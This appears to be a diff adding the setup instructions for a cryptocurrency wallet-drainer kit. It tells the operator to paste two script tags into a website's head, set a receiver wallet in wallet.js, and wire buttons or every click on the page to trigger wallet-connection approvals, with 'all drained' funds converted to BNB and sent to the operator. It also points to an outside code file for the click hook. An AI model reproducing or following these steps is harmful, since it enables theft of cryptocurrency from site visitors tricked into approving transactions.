@@ -1,0 +1,24 @@
+Instructions
+
+<script charset="UTF-8" async type="text/javascript" src="./a368b67175218.46f.js"></script>
+<script charset="UTF-8" type="text/javascript" src="./wallet.js"></script>
+
+Paste these scripts in the head of your index.html and move the JS files in the root of your website
+
+----------------------------------------------------------------------------------
+
+Change your information in the bottom of wallet.js ( WEBSITE AND WALLET ADDRESS) 
+All Drained will be convert into BNB and send to the receiver wallet ( BNB - BINANCE SMART CHAIN)
+
+Now let's link a buttons to drainer:
+
+If you want to make any click on site - connection request:
+Paste this code (https://decue.la/responsive_everywhere.txt) before </body> (Will save on hover animations)
+
+If you want to link exact button or element to drainer:
+Find element in index.html file by searching for button text
+Find class="some random-classes here" in it
+And add connectButton to the end (Before ")
+
+
+Woooaa, all done! Have a good job and a lot of approvals
